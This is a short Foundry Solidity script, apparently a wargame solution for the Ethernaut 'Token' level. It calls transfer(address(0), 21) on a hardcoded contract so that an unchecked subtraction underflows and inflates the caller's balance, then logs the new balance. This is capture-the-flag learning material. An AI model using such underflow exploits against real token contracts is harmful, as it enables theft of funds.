//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../src/Token.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";


contract TokenSolution is Script {

    Token public tokenInstance = Token(0xC10b5cf69Ba90Bef75185D8c68DB16Af3D47ef5f);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        console.log("My balance: ", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}